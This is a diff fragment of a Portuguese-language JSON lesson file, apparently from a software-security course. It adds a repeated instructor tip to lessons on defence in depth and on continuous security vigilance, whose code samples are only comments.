+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -2337,12 +2395,14 @@
         {
           "title": "Um Jogo de Camadas",
           "body": "A verdadeira segurança em computação constrói-se com a 'Defesa em Profundidade'. Trata-se de enfileirar múltiplas camadas e barreiras sobrepostas (Firewalls, HTTPS, Validação de Entrada, Hashing, AuthZ). A intenção é que, caso o invasor consiga perfurar a primeira barreira, ele imediatamente enfrente a segunda e a terceira, ganhando tempo para a detecção e neutralizando danos catastróficos.",
-          "code": "// Se o CORS for contornado (camada 1),\n// Se o Rate Limiter for burlado (camada 2),\n// A validação via Zod (camada 3) segura a sujeira e,\n// Se o banco vazar (camada 4), as senhas de fato estarão com hashes impossíveis de quebrar."
+          "code": "// Se o CORS for contornado (camada 1),\n// Se o Rate Limiter for burlado (camada 2),\n// A validação via Zod (camada 3) segura a sujeira e,\n// Se o banco vazar (camada 4), as senhas de fato estarão com hashes impossíveis de quebrar.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Vigilância, Estudos e Cultura",
           "body": "Ferramentas podem falhar, bibliotecas tornam-se obsoletas e as técnicas de ataque sofrem mutações constantes. O profissional que domina segurança é aquele que estuda continuamente, acompanha blogs e comunidades de cibersegurança e instiga, durante todo o ciclo de criação de software de sua empresa, a constante cultura de suspeita e responsabilidade.",
-          "code": "// A jornada final da segurança.\n// O software não termina quando você aperta \"Deploy\", a guerra pela integridade dos dados começa a partir desse exato segundo.\nreturn 'Eterna Vigilância.';"
+          "code": "// A jornada final da segurança.\n// O software não termina quando você aperta \"Deploy\", a guerra pela integridade dos dados começa a partir desse exato segundo.\nreturn 'Eterna Vigilância.';",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
